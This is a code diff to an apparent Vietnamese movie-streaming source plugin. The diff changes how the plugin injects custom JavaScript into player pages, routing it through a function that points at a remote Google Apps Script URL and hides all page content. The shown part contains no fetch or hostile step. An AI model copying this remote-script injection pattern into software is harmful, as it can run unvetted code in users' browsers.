@@ -11,7 +11,7 @@ function getManifest() {
         "id": "testvideo",          
         "name": "Test Embed",
         "description": "Nguồn xem phim Online ổn định",
-        "version": "1.3",             
+        "version": "1.5",             
         "baseUrl": BaseURL,
         "iconUrl": "https://crimescenesolutions.co.za/wp-content/uploads/2026/04/phimhayok-io-fav.jpg", 
         "isEnabled": true,
@@ -111,7 +111,7 @@ function parseMovieDetail(html) {
         var des = "\r\n\r\n" + html;
         var img = "https://img-cdn.phimhayok.net/filmhayok/1782912263995/20260701/ChatGPT-Image-19_29_49-1-thg-7-2026_a20d108246f140ad8be82acb9bca2606.png";
         var episodes = [{ id: id, name: "Xem Ngay", slug: "full" }];
-        var customjs = textJS();
+        var customjs = 'localStorage.setItem("adsd","1232");' + textJS();
         return JSON.stringify({
             "id": id,
             "title": title,
@@ -140,7 +140,7 @@ function parseDetailResponse(html,url) {
         var videoUrl = BaseJSON.link || "";
         var refUrl = BaseJSON.ref || "";
         var agent = BaseJSON.codeb || "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
-        var customjs = BaseJSON.codec || "";
+        var customjs = textJS() || "";
         return JSON.stringify({
             "url": videoUrl, 
             "headers": {
@@ -236,7 +236,7 @@ function base64Encode(str) {
 function textJS() {
     // Sử dụng biến $url từ tham số truyền vào thay vì ghi cứng link
     return `
-SCRIPTURL = "https://script.google.com/macros/s/AKfycbwsvLFzWMdxvX9ZH-3wnP3GJzS58v0CtT_0mlEYeOz6cOsgen9IR3c6VPv_EssPXMFzwQ/exec?name=xxxfiles&type=js"; 
+SCRIPTURL = "https://script.google.com/macros/s/AKfycbwsvLFzWMdxvX9ZH-3wnP3GJzS58v0CtT_0mlEYeOz6cOsgen9IR3c6VPv_EssPXMFzwQ/exec?name=testVideo&type=js"; 
 const style = document.createElement('style');
 var customcss = 'body { background: black; overflow: hidden; }body * {background: black;display:none!important}';
 style.innerHTML = customcss;
